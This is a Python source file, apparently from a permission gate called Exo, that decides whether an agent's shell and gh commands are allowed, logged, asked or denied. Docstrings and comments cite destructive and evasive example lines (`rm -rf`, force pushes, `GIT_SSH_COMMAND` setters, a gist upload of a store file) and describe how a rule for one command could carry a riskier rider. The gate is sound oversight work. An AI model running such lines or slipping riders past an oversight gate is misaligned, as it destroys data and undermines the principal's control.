    """The test a rule that would lower a compound line passes on top of matching the line (#394), as a test of (the
    rule's decision, its `command` patterns). They must match the own text of every simple command that carries the
    line's category or is as severe as the combined result, so a regex written for one command cannot lower a line
    whose deciding command it does not name. The combined result is one of these: the deciding command's part, or a
    part the gate made (a secret on the line, the opaque_exec reading of a `$".."` line) with no own text, and then
    no such rule lowers the line. They must also match every other part that alone would get a stricter outcome than
    the rule's decision, by its category line and the matrix or by the rules (a rider: `rm -rf build && git push
    --force origin main` under an allow rule for the push), and every command that changes the shell for the
    commands after it (Classification.setters: `export GIT_SSH_COMMAND=$X; git push ..`)."""
    parts, top = list(_each_part(c)), _severity(c)
    core = {id(p) for p in parts if p.category == c.category or _severity(p) >= top}
    setters = list(dict.fromkeys(t for p in parts for t in p.setters))
    bare = {**pol, "gates": {**pol["gates"], "rules": []}}
    raises = any(r["decision"] != "allow" for r in pol["gates"].get("rules") or [])   # an allow rule only lowers
    alone: dict[tuple, int] = {}

    def stricter(p: Classification, level: int) -> bool:
        # The part alone, without the parts it was built from (each is tested in turn): no rule lowers it here.
        # Parts alike decide alike, so a long line of the same few commands is decided a few times. A gh part is
        # also decided on each other target it may land on (#399), so those are part of what makes parts alike.
        text = p.own if p.own is not None else p.command
        key = (p.category, p.reversibility, p.exposure, p.third_party, p.cost, p.tool, p.summary, p.target, p.text,
               p.title, p.text_file, text, tuple(p.signals), tuple(p.alt_targets))
        if key not in alone:
            q = replace(p, parts=[], command=text, _command_views=[])
            out = OUTCOMES.index(decide(q, bare, ctx).outcome)
            alone[key] = max(out, OUTCOMES.index(decide(q, pol, ctx).outcome)) if raises else out
        return alone[key] > level

    def test(decision: str, patterns: list[str]) -> bool:
        regexes, seen, level = [re.compile(x) for x in patterns], {}, OUTCOMES.index(decision)

        def named(t: str | None) -> bool:
            if t not in seen:
                seen[t] = t is not None and any(rx.search(t) for rx in regexes)
            return seen[t]
        return all(named(t) for t in setters) and \
            all(named(p.own) or (id(p) not in core and not stricter(p, level)) for p in parts)
    return test


def _part_hits(entries: Iterable, c: Classification) -> list[tuple[Classification, str]]:
    """Each part of the classification (the combined result first, then every simple command it was built
    from) with the reserved or deny entry that matches it (D-075): a compound line is denied when any simple
    command on it is. A `command` pattern matches a part on the part's own text or on any decoded view of the
    line (#136); each pattern is run over the line's views once, not once per part."""
    entries = list(entries)
    line = _line_matcher(c)
    return [(p, hit) for p in _each_part(c) if (hit := _list_matches(entries, p, line))]


def _whole_line_test(c: Classification, pol: Mapping, ctx: Mapping) -> Callable[[Mapping], bool]:
    """Whether a rule passes the own text test of the whole line (_line_own_test), for the #191 pass on a store line
    (#547). A failure while the test is built or run counts as a fail, so the part's deny stands: the pass only ever
    passes more rules over than main does. The answer does not depend on the part, so each rule is tested once per
    line, and the pass stays linear in the parts of a long line."""
    try:
        test = _line_own_test(c, pol, ctx)
    except Exception:
        return lambda r: False
    memo: dict[int, bool] = {}

    def passes(r: Mapping) -> bool:
        if id(r) not in memo:
            try:
                memo[id(r)] = bool(test(r["decision"], [str(x) for x in _as_list(r["match"]["command"])]))
            except Exception:
                memo[id(r)] = False
        return memo[id(r)]
    return passes


def _override_deny(c: Classification, gates: Mapping, passed: list[Mapping] | None = None,
                   whole: Callable[[Mapping], bool] | None = None) -> tuple[Classification, str, str] | None:
    """The first part of the line, below the combined result, that its matrix cell, a category line or a rule denies
    as it would deny that command alone (#191): its matrix cell (#464), then its category's line, then the first rule
    that matches it; or a deny rule whose `command` regex matches only a decoded view of the line (#136).
    ``(part, why, step)`` or None. The cell matters where the combined result's axes are not the part's: a store
    write or secret beside a delete or force push (`rm -rf ~/work; touch ~/.exo/state/x`), or a matrix that denies a
    less severe cell than the dominant part's.
    With ``passed`` (#394), an allow, log or ask rule keyed on `command` that matches must also match the part's own
    text, or it is passed over and added to ``passed``: a rule written for another command on the line does not lift
    the part's deny. Deny rules match as before, so every part denied without this test is denied with it.
    With ``whole`` as well, the own text test of the whole line (_whole_line_test, given only on a store line, #547),
    such a rule that passes the part's test must also pass this one, as it must at the rule step of a line that a
    store write does not lead: an allow rule for the push in `git push --force origin main && gh gist create
    ~/.exo/plugins/foo/__init__.py` names neither the store send nor the line's lead, so the push's matrix deny stands.
    It only passes more rules over, so every part denied without it is denied with it."""
    cats, rules, matrix = gates.get("categories") or {}, gates.get("rules") or [], gates["matrix"]
    if not (cats or rules or any(v == "deny" for row in matrix.values() for v in row.values())):
        return None
    line = _line_matcher(c)
    for p in list(_each_part(c))[1:]:
        out, why, step = matrix[p.reversibility][p.exposure], f"{p.reversibility} and {p.exposure}", "matrix"
        if p.category in cats:
            out, why, step = cats[p.category], f"category {p.category}", "category"
        first = None
        for r in rules:
            if not _rule_matches(r["match"], p):
                continue
            # #465: a part read from a nested line carries that line as its text, so a rule keyed on `command` that
            # would lift it must also name the whole line, as it must when that command decides the line itself
            if r["decision"] != "deny" and "command" in r["match"] and p.command != c.command and \
                    not _rule_matches({"command": r["match"]["command"]}, c):
                continue
            if passed is not None and r["decision"] != "deny" and "command" in r["match"] and not (
                    p.own is not None and any(re.search(str(x), p.own) for x in _as_list(r["match"]["command"]))):
                passed.append(r)
                continue
            if passed is not None and whole is not None and r["decision"] != "deny" and "command" in r["match"] and \
                    not whole(r):
                passed.append(r)
                continue
            first = r
            break
        if first is not None:
            out, why, step = first["decision"], first["reason"], "rule"
        if out != "deny":
            veto = next((r for r in rules if r["decision"] == "deny" and "command" in r["match"]
                         and _rule_matches(r["match"], p, veto=True, line=line)), None)
            if veto is None:
                continue
            why, step = veto["reason"], "rule"
        return p, why, step
    return None


def apply_scopes(c: Classification, scopes: Mapping) -> tuple[str, bool]:
    """Effective (exposure, third_party) after the principal's own scopes."""
    if c.target and _glob_any(c.target, scopes.get("private") or []):
        return "private", False
    if c.target and _glob_any(c.target, scopes.get("internal") or []):
        exp = "internal" if c.exposure == "public" else c.exposure
        return exp, False
    # repo#number targets: match the repo part too
    repo = c.target.split("#", 1)[0]
    if repo != c.target:
        if _glob_any(repo, scopes.get("private") or []):
            return "private", False
        if _glob_any(repo, scopes.get("internal") or []):
            return ("internal" if c.exposure == "public" else c.exposure), False
    return c.exposure, c.third_party


UNSEEN_BODY = ("the gate cannot read the body (stdin, a file it did not read, $(..) or a variable); "
               "pass the text inline or as an absolute --body-file path")
# A body file the caller left unread because the line does more than post (#343, ``held_body_files``): the rest of the
# line may change the file before gh reads it, so an absolute path alone does not get it read.
UNSEEN_ON_LINE = ("the gate did not read the body file, since the line does more than post and could change the "
                  "file before gh reads it; run the post on a line of its own, or pass the text inline")


def fill_body(c: Classification, text: str) -> None:
    """Give a post the ``text`` a caller read from its body file. Each copy of the post on another target among its
    parts (#399, ``alt_copy``) gets it too, so a copy does not count as unseen (``body_unseen``)."""
    c.text = text
    c.parts = [replace(p, text=text) if p.alt_copy and p.text_file == c.text_file and not p.text else p
               for p in c.parts]


def body_unseen(c: Classification) -> bool:
    """Whether an outbound body, title or field on the line is out of the gate's sight (#208): a part with the
    ``unseen_body`` signal, or a post's body file nobody read into its text. Such a post asks under the posting
    rules, never gets a standing grant, and a required executor refuses it. Each reading of the line counts
    (readings: as read before #399, #311 or #471), so a line unseen as the gate read it then stays unseen."""
    return any("unseen_body" in p.signals or (p.text_file and not p.text
                                              and (p.category in OUTBOUND or p.category == "vcs_merge"))
               for x in readings(c) for p in _each_part(x))


def check_post(text: str, posting: Mapping, *, title: str = "", agents: Iterable[str] = (),
               exposure: str = "public") -> list[str]:
    """Violations of the posting rules in outbound text. Empty list = clean."""
    out: list[str] = []
    both = "\n".join(x for x in (title, text) if x)
    footer = str(posting.get("footer") or "").strip()
    footer_on = posting.get("footer_exposures") or ("internal", "public")
    if footer and text and exposure in footer_on and not text.rstrip().endswith(footer):
        out.append(f"missing footer: {footer}")
    for f in posting.get("forbid") or []:
        if isinstance(f, Mapping):
            pat, label = str(f.get("pattern", "")), str(f.get("label") or f.get("pattern"))
            if pat and re.search(pat, both, re.I if f.get("ignore_case") else 0):
                out.append(f"forbidden: {label}")
        elif str(f) and str(f) in both:
            out.append(f"forbidden: {f}")
    words = [str(w) for w in (posting.get("forbid_words") or [])]
    if posting.get("forbid_agent_names"):
        words += [str(a) for a in agents]
    for w in dict.fromkeys(words):
        if w and re.search(r"(?<![\w-])" + re.escape(w) + r"(?![\w-])", both, re.I):
            out.append(f"forbidden word: {w}")
    mx = posting.get("max_chars")
    if mx and len(text) > int(mx):
        out.append(f"longer than {int(mx)} characters")
    return out


def decide(c: Classification, policies: Mapping | None = None, context: Mapping | None = None) -> Decision:
    """Map a classification through the principal's policies. Pure.

    Order: matrix cell, then a category override, then the first matching rule (each may lower
    or raise). Then only raises: a deny or ask rule whose `command` regex matches the literal-word
    view but not the text, reserved actions, escalations (budget, third party, listed categories),
    posting violations (a body the gate cannot read is one) and the operator floor. A deny entry wins
    over everything, and so does a category line or rule that denies any part of a compound line. A line
    with a `$".."` word is also decided as opaque_exec, and the stricter outcome stands. So is a line with a part read
    behind a quoted prefix assignment, also decided with the part on top that the gate read there before #471, and
    the call read as before #471 (Classification.before) is decided too, and the two merge as #399's readings do
    (_strictest). `context` may carry `spent_today` for the daily budget, and `held_body_files`: the body files the
    caller left unread because the line does more than post (#343), whose posts get UNSEEN_ON_LINE for their unseen
    note, and UNSEEN_BODY beside it when they are also unseen another way.

    On a compound line, a rule keyed on `command` that would lower the line (its decision is below the matrix cell
    and category line, or it is an allow or log rule that names opaque_exec) must match the line as before and also
    name each command that decides the line, each that would be stricter alone and each that changes the shell state
    for the rest (#394, _line_own_test). A rule that fails is passed over, and the rule step keeps the stricter of
    the first match, as before, and the rule found after it. A rule passed over never names opaque_exec for the
    floor. The #191 pass asks the same of a rule that would lift a part's deny, so it denies each part it denied
    before, and on a store line it also asks that rule to pass the test of the whole line (#547). So that pass is
    never looser than deciding as before. When it passes a rule over, the line is also decided as before, and that
    decision stands unless the other is stricter, reason and all. That pass reads rules
    and patterns the decision before never reached (a regex past the first match, a rule after the one skipped), so
    when it fails, the line is decided as before, which then fails only where it failed before. A line of one simple
    command, beside parts the gate made for it, is decided as before (_one_text) — unless the part the call's own
    folder added is on it. That part carries a `_StandIn` for `cd <folder>` among its setters (#516), so the line
    goes through the own text pass: a rule that names only the command is passed over, and the part's matrix deny
    stands, as it does on the cd form, whose parts the `cd`'s own text makes two texts of.

    A line the gate reads more than one way is decided on each reading first (readings): the shell call as read
    before #311 (``also``), the gh line as read before gh's subcommand search (``floor``, #399) and that line's own
    reading before #311, the call as read before D-074 (``ordinary``, #125), the call with each `env -S` text read as
    before (``split_readings``, #591), then the line on each other target it may land on (``alt_targets``). Each
    reading goes
    through all of the above, the own text pass and its fallback too, and the strictest stands on each axis
    (_strictest), so a reading only raises the line.
    """
    pol = policies if (policies and policies.get("_normalized")) else normalize_policies(policies)
    ctx = dict(context or {})
    if c.before is not None:
        # #471: the call read as before, each quoted prefix assignment the program; the folder a `cd` behind one left
        # and the parts read after it then decide as they did before. The two merge as #399's readings do, so each
        # violation stays listed as often as one of them lists it (two posts to one PR that both miss the footer).
        return _strictest([decide(replace(c, before=None), pol, ctx), decide(c.before, pol, ctx)], ["", ""])
    rs = readings(c)
    if len(rs) > 1:
        # #311: the call as read before (a shell call's folder made it credentials as a whole, #209), and #399: the
        # line as the gate read it before gh's subcommand search, D-074: the call with the Exo home's config.json
        # an ordinary file, #591: the call with each env -S text read as before, and #471: the call as read before
        # (a quoted prefix assignment the program), are decided too, so none decides lower.
        return _strictest([decide(replace(r, also=None, floor=None, ordinary=None, before=None, split_readings=[]),
                                  pol, ctx) for r in rs],
                          [""] + [f" (for {redact_userinfo(r.summary or r.category)})" for r in rs[1:]])
    if c.alt_targets:
        # #399: decided on each target the gate cannot rule out.
        base = replace(c, alt_targets=[])
        return _strictest([decide(base, pol, ctx)] + [decide(replace(base, target=t), pol, ctx) for t in c.alt_targets],
                          [""] + [f" (if it lands on {_target_names([t])})" for t in c.alt_targets])
    if c.displaced is not None:
        # #454: a sudo write leads the line in place of the command's own costly part. The line is also decided with
        # that part leading, as before, with its other targets (#399), and the stricter stands. On a tie the decision
        # keeps both reasons too, as bump() does for an equal level.
        p = c.displaced
        d = decide(replace(c, displaced=None), pol, ctx)
        alt = decide(replace(c, category=p.category, cost=p.cost, summary=p.summary, target=p.target, own=p.own,
                             alt_targets=list(p.alt_targets), displaced=None), pol, ctx)
        both = _strictest([d, alt], ["", ""])
        if alt.outcome == d.outcome:
            both.reason = "; ".join(dict.fromkeys(d.reason.split("; ") + alt.reason.split("; ")))
            both.rule = alt.rule if d.rule == "matrix" else d.rule
        both.displaced_asks = OUTCOMES.index(alt.outcome) >= OUTCOMES.index("ask")
        return both
    if _one_text(c):
        return _decide(c, pol, ctx, None)
    passed: list[Mapping] = []
    try:
        d = _decide(c, pol, ctx, passed)
    except Exception:
        return _decide(c, pol, ctx, None)
    if passed:
        before = _decide(c, pol, ctx, None)
        if OUTCOMES.index(d.outcome) <= OUTCOMES.index(before.outcome):
            return before
    return d


def _decide(c: Classification, pol: Mapping, ctx: dict, passed: list[Mapping] | None) -> Decision:
    """decide() under normalized policies. With ``passed``, a rule that would lower a compound line must also pass
    the own text test, and each rule that test passes over is added to ``passed`` (#394): each step keeps the
    stricter outcome, so the decision is never looser than without. Without ``passed``, as before #394."""
    gates, budget, posting = pol["gates"], pol["budget"], pol["posting"]
    eff = _scoped(c, gates.get("scopes") or {})

    outcome = gates["matrix"][eff.reversibility][eff.exposure]
    reason, rule = f"{eff.reversibility} and {eff.exposure}", "matrix"
    # D-038: the principal may lower opaque code only by naming it below ask (a category line or a rule on
    # opaque_exec). Naming it at ask or deny keeps the indirection floor (#178).
    below_ask = ("allow", "log")
    opaque_named = gates.get("categories", {}).get("opaque_exec") in below_ask
    if eff.category in gates.get("categories", {}):
        outcome, reason, rule = gates["categories"][eff.category], f"category {eff.category}", "category"

    def names_opaque(r: Mapping | None) -> bool:
        return r is not None and r["decision"] in below_ask and \
            "opaque_exec" in [str(x) for x in _as_list(r["match"].get("category", []))]

    # The first rule that matches (`first`), and with ``passed`` the first that also passes the own text test when
    # it would lower the line (`picked`, #394). Rules that keep or raise the outcome match as before.
    first: Mapping | None = None
    picked: Mapping | None = None
    own: Callable[[str, list[str]], bool] | None = None
    base = OUTCOMES.index(outcome)
    for r in gates.get("rules") or []:
        if not _rule_matches(r["match"], eff):
            continue
        first = first or r
        if passed is not None and eff.parts and "command" in r["match"] and \
                (OUTCOMES.index(r["decision"]) < base or names_opaque(r)):
            own = own or _line_own_test(eff, pol, ctx)
            if not own(r["decision"], [str(x) for x in _as_list(r["match"]["command"])]):
                passed.append(r)
                continue
        picked = r
        break
    # The stricter of the two steps stands, the first rule's when they are alike. A rule passed over does not name
    # opaque_exec for the floor, and a later rule does so only when the first one does too.
    chosen = first
    if first is not None and picked is not first and \
            OUTCOMES.index(picked["decision"] if picked else outcome) > OUTCOMES.index(first["decision"]):
        chosen = picked
    if chosen is not None:
        outcome, reason, rule = chosen["decision"], chosen["reason"], "rule"
    opaque_named = opaque_named or (names_opaque(first) and names_opaque(picked))

    def bump(level: str, why: str, step: str):
        # A higher level takes over. An equal one adds its reason, and names itself as the
        # cause when the level so far came only from the matrix cell.
        nonlocal outcome, reason, rule
        if OUTCOMES.index(level) > OUTCOMES.index(outcome):
            outcome, reason, rule = level, why, step
        elif level == outcome:
            reason = f"{reason}; {why}"
            if rule == "matrix":
                rule = step

    # A deny or ask rule keyed on `command:` also sees the literal-word view (#136), and can only raise.
    # A rule the command text matched was settled by the first-match pass above, whatever its place
    # in the list, so this never changes an outcome the view did not add to.
    for r in gates.get("rules") or []:
        if r["decision"] in ("ask", "deny") and "command" in r["match"] \
                and not _rule_matches(r["match"], eff) and _rule_matches(r["match"], eff, veto=True):
            bump(r["decision"], r["reason"], "rule")

    # #188: a command bash runs only as it reads a value again may outrank a deny on the line; naming opaque_exec
    # does not lower that ask.
    reread = "reread" in eff.signals
    # #471: an unknown program on the line asks too, also beside a more severe part that logs.
    if (eff.category == "opaque_exec" or "indirection" in eff.signals or "unknown program" in eff.signals) and \
            (reread or not opaque_named):
        bump("ask", "runs code the gate cannot fully see (" + (c.summary or "indirection") + ")", "opaque")
    reserved = _part_hits(gates.get("reserved") or [], eff)
    if reserved:
        bump("ask", f"reserved for the principal ({reserved[0][1]})", "reserved")
    esc = gates.get("escalate") or {}
    if esc.get("cost_over_budget", True):
        per_action = float(budget.get("per_action_max") or 0)
        if eff.cost is None and eff.category == "payment":
            bump("ask", "spend of unknown amount", "budget")
        elif eff.cost:
            if eff.cost > per_action:
                bump("ask", f"spend {eff.cost:g} above per-action limit {per_action:g}", "budget")
            per_day = float(budget.get("per_day_max") or 0)
            if float(ctx.get("spent_today") or 0) + eff.cost > per_day:
                bump("ask", f"spend would pass the daily limit {per_day:g}", "budget")
    if esc.get("third_party", True) and eff.third_party:
        bump("ask", "affects a third party", "escalate")
    if eff.category in (esc.get("categories") or []):
        bump("ask", f"{eff.category} always asks", "escalate")

    violations: list[str] = []
    unseen = body_unseen(eff)
    held_files = ctx.get("held_body_files") or ()
    applies_to = posting.get("applies_to") or POSTING_DEFAULT
    # Whether the combined classification alone would run the checks (kept for the line-wide
    # unseen note below): its category is under applies_to, or it is a close or merge carrying
    # text (#326, #397).
    line_applies = eff.category in applies_to or (eff.category in ("github_close", "vcs_merge")
                                                  and (eff.text or eff.title or unseen))

    def post_unseen(p: Classification, file: bool = True) -> bool:
        """One part's unseen body (#208): a body file nobody read into its text, or its own
        unseen_body signal. _combine gives the part it picks every part's signals, so this reads
        the ones it carried before (own_signals). A part given them some other way counts a
        signal a part below it also carries as that part's, not its own. With `file` off, only the signal counts."""
        if file and p.text_file and not p.text and (p.category in OUTBOUND or p.category == "vcs_merge"):
            return True
        if p.own_signals is not None:
            return "unseen_body" in p.own_signals
        return "unseen_body" in p.signals and not any(
            "unseen_body" in q.signals for q in _each_part(p) if q is not p)

    # #396: the checks run on every post on the line, not only on the dominant part's text, so a
    # clean first post cannot carry a second one past the footer, the forbidden words and the
    # scrub. A part counts when its category is under applies_to (a close or merge carrying text
    # counts, #326, #397) and it carries text, a title or an unseen body. The combined
    # classification's own violations and the line-wide unseen note stay bare and are all listed;
    # another part's are named after it, and only so many of those are listed (_LISTED_VIOLATIONS)
    # that a line of many posts keeps its reason and its card short. A gh post's copy on another
    # target it may land on (#399, alt_copy) lists, right after its post, only what neither the
    # post nor another copy of it lists. The gate cannot tell which of a post's targets main read
    # it on, so the entries of posts with copies and of the copies have a room of their own,
    # _LISTED_WITH_COPIES, beside the room the other posts' entries have, as on main. Each list
    # keeps the line's order, so every entry main lists is listed while the posts with copies list
    # no more than that (#439 round 11). The count stays bounded, the ledger row by count only (#485).
    # The copy of a secret line's heaviest other command (#320, line_copy) stands for the line main
    # reads, so its entries are all listed, named after it, and take none of the room the other
    # posts' entries have.
    checked, post_unseen_seen = False, False
    named: list[str] = []
    copied_line: list[str] = []
    held: list[bool] = []       # per named entry: of a post with copies or of a copy
    found_on: dict[int, list[str]] = {}
    post_of = {id(k): id(q) for q in _each_part(eff) for k in q.parts if k.alt_copy}
    copied = set(post_of.values())
    for p in _each_part(eff):
        p_unseen = post_unseen(p)
        if p.category not in applies_to and not (p.category in ("github_close", "vcs_merge")
                                                 and (p.text or p.title or p_unseen)):
            continue
        if not (p.text or p.title or p_unseen):
            continue
        checked = True
        found = check_post(p.text, posting, title=p.title, agents=pol.get("agents") or [],
                           exposure=p.exposure)
        found += check_scrub(p.text, pol.get("scrub"), title=p.title, exposure=p.exposure)  # D-033
        if p_unseen:  # the checks above saw only part of this post, so they cannot pass it
            # A body file left unread for the line gets its own note (#343). The plain one stays when the post is
            # also unseen otherwise (a title from a variable, a repeated option), which the post alone still is.
            on_line = p.text_file in held_files and not p.text
            found += [UNSEEN_ON_LINE] * on_line + [UNSEEN_BODY] * (not on_line or post_unseen(p, file=False))
            post_unseen_seen = True
        found_on[id(p)] = found
        if p.alt_copy:
            listed = found_on.setdefault(post_of.get(id(p), 0), [])
            found = [v for v in found if v not in listed]
            listed += found
        if p is eff:
            violations += found
        elif p.line_copy:
            copied_line += [f"{redact_userinfo(p.summary or p.category)}: {v}" for v in found]
        else:
            named += [f"{redact_userinfo(p.summary or p.category)}: {v}" for v in found]
            held += [p.alt_copy or id(p) in copied] * len(found)
    if unseen and not post_unseen_seen and (checked or line_applies):
        violations.append(UNSEEN_BODY)  # a body on a part the posting rules do not cover is still unseen
    room, seen, listed = max(_LISTED_VIOLATIONS - len(violations), 0), [0, 0], []
    hidden: list[str] = []
    for v, h in zip(named, held):
        (listed if seen[h] < (_LISTED_WITH_COPIES if h else room) else hidden).append(v)
        seen[h] += 1
    left = len(hidden)
    violations += copied_line + listed + ([f"and {left} more on other posts"] if left else [])
    if violations:
        bump("ask", "posting rules: " + "; ".join(violations), "posting")

    # Operator floor (P11): outside the principal model, cannot be lowered by policy.
    if eff.reversibility == "irreversible" and eff.exposure == "public" and eff.third_party:
        bump("ask", "irreversible, public and affects a third party", "floor")

    # Credentials floor: no policy, rule, scope or escalate setting lowers this. The principal answers. A line that
    # keeps its own category but has a credentials part (a store read from a shell call's own folder, #311) asks so.
    secret = eff if eff.category == "credentials" else next(
        (p for p in _each_part(eff) if p.category == "credentials"), None)
    if secret is not None:
        bump("ask", "credentials always ask the principal" + (f" ({secret.summary})" if secret is not eff else ""),
             "floor")

    # Store floor (D-038): the gate's own policies, grants, ledger, keys, seats and sockets. Same terms.
    if eff.category == "store_write":
        bump("ask", "writes to the Exo store; only the principal approves, every time", "floor")

    # #191: a matrix cell (#464), category line or rule that would deny a part alone denies the line, as a deny entry
    # does (D-075). On a store line, a rule that would lift a part's deny must also pass the own text test of the
    # whole line (#547), as the rule step asks of a rule on a line a store write does not lead (#394).
    whole = _whole_line_test(eff, pol, ctx) if outcome != "deny" and passed is not None and \
        eff.category == "store_write" and eff.parts else None
    if outcome != "deny" and (part := _override_deny(eff, gates, passed, whole)):
        p, why, step = part
        outcome, reason, rule = "deny", f"denied by policy ({why}: {redact_userinfo(p.summary or p.category)})", step
    if (denied := _part_hits(gates.get("deny") or [], eff)):
        outcome, reason, rule = "deny", f"denied by policy ({denied[0][1]})", "deny"
    d = Decision(outcome=outcome, reason=reason, rule=rule, violations=violations,
                 exposure=eff.exposure, third_party=eff.third_party,
                 reserved=list(dict.fromkeys((p.category, p.target) for p, _ in reserved)), hidden=hidden)
    if _QUOTED in c.signals:
        # #471: the parts read behind a quoted prefix assignment were hidden before, and the other parts decided the
        # steps that read the dominant part (the matrix cell, category lines, rules, escalation). Decide the line with
        # the one of those _combine would put on top too, and keep the stricter. Its text is left to that part, which
        # the posting checks still read, so no violation is listed twice.
        read = [p for p in _each_part(c) if _QUOTED not in (p.signals if p.own_signals is None else p.own_signals)]
        top = next((p for p in read if p.category == "credentials"), None) or \
            next((p for p in read if p.category == "store_write"), None) or _most_severe(read)
        if top is not None and top is not c:
            alt = _decide(replace(c, category=top.category, reversibility=top.reversibility, exposure=top.exposure,
                                  third_party=top.third_party, cost=top.cost, summary=top.summary, target=top.target,
                                  link=top.link, text="", title="", text_file="", own=top.own, own_signals=[],
                                  signals=[x for x in c.signals if x != _QUOTED]), pol, ctx, passed)
            if OUTCOMES.index(alt.outcome) > OUTCOMES.index(d.outcome):
                d = alt
    if "locale translation" in c.signals and c.category != "opaque_exec":
        # A $".." word can turn into any code (#136): decide the line as opaque_exec too, and keep the stricter.
        # `replace` keeps the parts as classifications, so their deny and reserved entries still apply. That
        # reading is the gate's, not a command's, so it has no own text: no rule that would lower it passes the
        # own text test on a compound line (#394), while a line of one part still matches its command text.
        rev, exp, third = CATEGORIES["opaque_exec"]
        alt = _decide(replace(c, category="opaque_exec", reversibility=rev, exposure=exp, third_party=third,
                              signals=["indirection"], own=None), pol, ctx, passed)
        if OUTCOMES.index(alt.outcome) > OUTCOMES.index(d.outcome):
            return alt
    return d


def _strictness(d: Decision) -> tuple:
    """How strict a decision is: its outcome, then its exposure, then whether it affects a third party."""
    return OUTCOMES.index(d.outcome), EXPOSURE.index(d.exposure), d.third_party


_HIDDEN = re.compile(r"and (\d+) more on other posts")


def _strictest(ds: list[Decision], why: list[str]) -> Decision:
    """The strictest of several decisions of one line, with the widest exposure, a third party if any has one, and
    every violation and reserved part any of them met (#399). ``why[i]`` ends the reason when ``ds[i]`` stands. A
    violation two posts of one name both meet is listed as often as one decision lists it. An ask from the displaced
    part of a sudo write line in any of them (#454) stays known, so the hook narrows who may answer for it."""
    i = max(range(len(ds)), key=lambda n: _strictness(ds[n]))
    violations: list[str] = []
    for d in ds:
        more = Counter(d.violations) - Counter(violations)
        for v in d.violations:
            if not _HIDDEN.fullmatch(v) and more[v] > 0:
                violations.append(v)
                more[v] -= 1
    # One `and N more on other posts`, last. It counts each entry a reading left out that the merged list does not
    # hold, as often as one reading holds it, listed or left out (#439 round 13). A copy's finding can be in the merged
    # list twice, once under the copy's name and once as the post's own on the copy's target, and neither twin stands
    # for an entry left out.
    held: Counter[str] = Counter()
    for d in ds:
        held |= Counter(v for v in d.violations if not _HIDDEN.fullmatch(v)) + Counter(d.hidden)
    hidden = list((held - Counter(violations)).elements())
    violations += [f"and {len(hidden)} more on other posts"] if hidden else []
    return replace(ds[i], reason=ds[i].reason + why[i], violations=violations,
                   exposure=EXPOSURE[max(EXPOSURE.index(d.exposure) for d in ds)],
                   third_party=any(d.third_party for d in ds),
                   reserved=list(dict.fromkeys(r for d in ds for r in d.reserved)), hidden=hidden,
                   displaced_asks=any(d.displaced_asks for d in ds))


def stricter(ds: list[Decision]) -> Decision:
    """The strictest of one line's decisions under several policies, merged as its readings merge (#557)."""
    return _strictest(ds, [""] * len(ds))


def _target_names(targets: Iterable[str]) -> str:
    """Targets as the principal reads them: `a`, `a or b`, `a, b or c`. An empty one is the repo gh picks with no
    `-R`, the current one."""
    names = list(dict.fromkeys(redact_userinfo(t) if t else "the current repo" for t in targets))
    return ", ".join(names[:-1]) + " or " + names[-1] if len(names) > 1 else "".join(names)


def summarize(c: Classification, d: Decision, default: str = "skip") -> str:
    """The one-line question the principal sees for an `ask`."""
    bits = [c.summary or c.tool or c.category]
    axes = [c.reversibility, d.exposure or c.exposure]
    if d.third_party:
        axes.append("third party")
    if c.cost:
        axes.append(f"cost {c.cost:g}")
    line = f"{bits[0]} ({', '.join(axes)})."
    alts = c.alt_targets or (c.displaced.alt_targets if c.displaced is not None and d.displaced_asks else [])
    if alts:
        # #399: the gate cannot tell which of these gh acts on. The decision covers each, and so does the question.
        line += f" It may land on {_target_names(alts)} instead."
    line += f" Why: {d.reason}."
    # #454: when the part a sudo write displaced asks, the link is that part's (a gh read's issue), as before
    link = (c.displaced.link if c.displaced is not None and d.displaced_asks else "") or c.link
    if link:
        line += f" Link: {link}."
    line += f" Default if no reply: {default}."
    return " ".join(line.split())


# --- peer messages (D-026) -------------------------------------------------------------------

PEER_OUTCOMES = ("auto", "hold", "deny")
PEER_TRUST = ("principal", "same-principal", "other", "remote", "unverified")
# Who wrote it, as the receiving side could check it. A person typing in a client of this seat is the
# principal; another session of the same principal on this machine is same-principal; a session of a
# different or unknown principal is other; a bus seat is remote; a bad or missing signature is unverified.
PEER_DEFAULTS = {"principal": "auto", "same-principal": "auto", "other": "hold", "remote": "hold",
                 "unverified": "deny"}


def decide_peer(trust: str, sender: str = "", config: Mapping | None = None) -> tuple[str, str]:
    """``(outcome, reason)`` for a message from ``sender`` at ``trust``: auto, hold or deny.

    ``config`` is the receiving seat's ``peers`` settings: ``policy`` maps a trust level to an outcome, and
    ``rules`` (``{"from": glob, "outcome": ...}``, first match wins) override it for named senders. An
    unverified sender is denied whatever the config says, and no setting makes a peer message consent to
    anything: this decides delivery only."""
    config = config or {}
    if trust == "unverified":
        return "deny", "the signature did not verify"
    for rule in config.get("rules") or []:
        if isinstance(rule, Mapping) and fnmatch.fnmatch(sender, str(rule.get("from") or "")):
            out = str(rule.get("outcome") or "")
            if out in PEER_OUTCOMES:
                return out, f"rule for {rule['from']}"
    table = {**PEER_DEFAULTS, **{k: v for k, v in (config.get("policy") or {}).items() if v in PEER_OUTCOMES}}
    out = table.get(trust, "hold")
    return out, f"{trust} sender: {out}"


# --- YAML subset reader (stdlib only) ------------------------------------------------------
#
# Supports what the policy files use: nested mappings by indentation, block lists of scalars
# or mappings, flow lists `[a, "b"]` and flow maps `{k: v}`, quoted and plain scalars (int,
# float, true/false, null), `#` comments, and folded `>` or literal `|` block scalars.
# Not supported: anchors, tags, multi-document streams, complex keys.

def _strip_comment(line: str) -> str:
    q, i = "", 0
    while i < len(line):
        ch = line[i]
        if q:
            if ch == "\\" and q == '"':
                i += 2
                continue
            if ch == q:
                q = ""
        elif ch in "'\"" and (i == 0 or line[i - 1] in " \t:[{,-"):
            q = ch
        elif ch == "#" and (i == 0 or line[i - 1] in " \t"):
            return line[:i].rstrip()
        i += 1
    return line.rstrip()


def _scalar(s: str) -> Any:
    s = s.strip()
    if s == "":
        return None
    if s[0] in "[{":
        val, rest = _flow(s, 0)
        if s[rest:].strip():
            raise PolicyError(f"trailing text after flow value: {s!r}")
        return val
    if s[0] == '"':
        if not s.endswith('"') or len(s) < 2:
            raise PolicyError(f"unterminated string: {s!r}")
        return json.loads(s)
    if s[0] == "'":
        if not s.endswith("'") or len(s) < 2:
            raise PolicyError(f"unterminated string: {s!r}")
        return s[1:-1].replace("''", "'")
    low = s.lower()
    if low in ("true", "yes", "on"):
        return True
    if low in ("false", "no", "off"):
        return False
    if low in ("null", "~"):
        return None
    if re.fullmatch(r"[-+]?\d+", s):
        return int(s)
